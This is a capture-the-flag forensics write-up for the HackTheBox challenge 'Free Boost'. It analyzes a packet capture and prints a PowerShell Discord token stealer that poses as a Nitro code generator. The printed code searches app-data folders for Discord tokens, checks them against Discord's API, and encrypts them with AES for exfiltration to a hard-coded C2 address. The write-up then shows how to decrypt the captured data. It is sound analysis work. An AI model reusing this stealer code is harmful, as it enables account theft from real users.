# HTB - Free Boost

**Platform:** HackTheBox  
**Difficulty:** Medium  
**Category:** Forensics  
**Date:** November 2024

---

## Challenge Description

A forensics challenge involving network traffic analysis and PowerShell malware investigation. The goal is to analyze a packet capture to uncover malicious activity and extract the flag.

## PART 1 - Initial Analysis

### Opening the Capture

Open `capture.pcapng` with Wireshark and start analyzing the network traffic.

Following TCP traffic, we found an interesting HTTP request: `GET /freediscordnitro HTTP/1.1`

The response to this endpoint contains PowerShell commands - a clear indicator of malicious activity.

![Wireshark capture showing malicious endpoint](/writeups/htb-free-boost/image.png)

### Analyzing the PowerShell Script

Once we extract and analyze the PowerShell commands, we get a complete malware script:

```powershell
$URL = "http://192.168.116.135:8080/rj1893rj1joijdkajwda"

function Steal {
    param (
        [string]$path
    )

    $tokens = @()

    try {
        Get-ChildItem -Path $path -File -Recurse -Force | ForEach-Object {
            
            try {
                $fileContent = Get-Content -Path $_.FullName -Raw -ErrorAction Stop

                foreach ($regex in @('[\\w-]{26}\\.[\\w-]{6}\\.[\\w-]{25,110}', 'mfa\\.[\\w-]{80,95}')) {
                    $tokens += $fileContent | Select-String -Pattern $regex -AllMatches | ForEach-Object {
                        $_.Matches.Value
                    }
                }
            } catch {}
        }
    } catch {}

    return $tokens
}

function GenerateDiscordNitroCodes {
    param (
        [int]$numberOfCodes = 10,
        [int]$codeLength = 16
    )

    $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
    $codes = @()

    for ($i = 0; $i -lt $numberOfCodes; $i++) {
        $code = -join (1..$codeLength | ForEach-Object { Get-Random -InputObject $chars.ToCharArray() })
        $codes += $code
    }

    return $codes
}

function Get-DiscordUserInfo {
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $true)]
        [string]$Token
    )

    process {
        try {
            $Headers = @{
                "Authorization" = $Token
                "Content-Type" = "application/json"
                "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.48 Safari/537.36"
            }

            $Uri = "https://discord.com/api/v9/users/@me"

            $Response = Invoke-RestMethod -Uri $Uri -Method Get -Headers $Headers
            return $Response
        }
        catch {}
    }
}

function Create-AesManagedObject($key, $IV, $mode) {
    $aesManaged = New-Object "System.Security.Cryptography.AesManaged"

    if ($mode="CBC") { $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC }
    elseif ($mode="CFB") {$aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CFB}
    elseif ($mode="CTS") {$aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CTS}
    elseif ($mode="ECB") {$aesManaged.Mode = [System.Security.Cryptography.CipherMode]::ECB}
    elseif ($mode="OFB"){$aesManaged.Mode = [System.Security.Cryptography.CipherMode]::OFB}

    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $aesManaged.BlockSize = 128
    $aesManaged.KeySize = 256
    if ($IV) {
        if ($IV.getType().Name -eq "String") {
            $aesManaged.IV = [System.Convert]::FromBase64String($IV)
        }
        else {
            $aesManaged.IV = $IV
        }
    }
    if ($key) {
        if ($key.getType().Name -eq "String") {
            $aesManaged.Key = [System.Convert]::FromBase64String($key)
        }
        else {
            $aesManaged.Key = $key
        }
    }
    $aesManaged
}

function Encrypt-String($key, $plaintext) {
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($plaintext)
    $aesManaged = Create-AesManagedObject $key
    $encryptor = $aesManaged.CreateEncryptor()
    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
    [byte[]] $fullData = $aesManaged.IV + $encryptedData
    [System.Convert]::ToBase64String($fullData)
}
```

### Finding Part 1 of the Flag

In the malware script, we can see these important variables:

```powershell
$local = $env:LOCALAPPDATA
$roaming = $env:APPDATA
$part1 = "SFRCe2ZyMzNfTj[REDACTED]"
```

**The base64 string contains the first part of the flag!**

Decoding the base64 string gives us Part 1 of the flag.

## PART 2 - Decryption

### Extracting Important Variables

From the script, we identify the AES encryption key:

```powershell
$AES_KEY = "Y1dwaHJOVGs5d2dXWjkzdDE5amF5cW5sYUR1SWVGS2k="
$payload = $userInfos | ConvertTo-Json -Depth 10
$encryptedData = Encrypt-String -key $AES_KEY -plaintext $payload
```

### Finding the Encrypted Data

Continuing with the Wireshark analysis, we find a POST request with encrypted data:

![Wireshark POST request with encrypted payload](/writeups/htb-free-boost/image2.png)

This POST request contains the encrypted exfiltrated data.

### Decryption Script

Using the AES key found in the malware, we can decrypt the data with this PowerShell script:

```powershell
function Decrypt-String {
    param (
        [string]$key,
        [string]$cipherText
    )

    $keyBytes = [Convert]::FromBase64String($key)
    $cipherBytes = [Convert]::FromBase64String($cipherText)

    $aes = [System.Security.Cryptography.AesManaged]::new()
    $aes.Key = $keyBytes
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7

    $ivSize = $aes.BlockSize / 8
    $iv = $cipherBytes[0..($ivSize - 1)]
    $cipherBytes = $cipherBytes[$ivSize..($cipherBytes.Length - 1)]

    $decryptor = $aes.CreateDecryptor($aes.Key, $iv)
    $memoryStream = [System.IO.MemoryStream]::new($cipherBytes)
    $cryptoStream = [System.Security.Cryptography.CryptoStream]::new($memoryStream, $decryptor, [System.Security.Cryptography.CryptoStreamMode]::Read)

    $streamReader = [System.IO.StreamReader]::new($cryptoStream)
    $plaintext = $streamReader.ReadToEnd()

    $streamReader.Close()
    $cryptoStream.Close()
    $memoryStream.Close()

    return $plaintext
}
```

### Executing the Decryption

Running the decryption script:

```powershell
$AES_KEY = "Y1dwaHJOVGs5d2dXWjkzdDE5amF5cW5sYUR1SWVGS2k="
$encryptedData = "<ENCRYPTED DATA FROM WIRESHARK>"

$decryptedPayload = Decrypt-String -key $AES_KEY -cipherText $encryptedData
$userInfos = $decryptedPayload | ConvertFrom-Json
```

![Executing the decryption script](/writeups/htb-free-boost/image3.png)

### Part 2 of the Flag

The decrypted output contains user information and another base64 string:

![Decrypted results showing the flag part](/writeups/htb-free-boost/image4.png)

**Decoding this base64 string gives us Part 2 of the flag!**

## Key Takeaways

- Discord token stealers often masquerade as fake "Discord Nitro" generators
- PowerShell malware uses AES encryption to exfiltrate stolen data
- Network traffic analysis with Wireshark reveals C2 communication
- Understanding encryption schemes allows analysts to decrypt exfiltrated data
- Always analyze both the malware code and network captures for complete understanding

## Tools Used

- Wireshark
- PowerShell
- Base64 decoder
- AES decryption

---

**Flag:** `HTB{[REDACTED]}`

Challenge completed! :)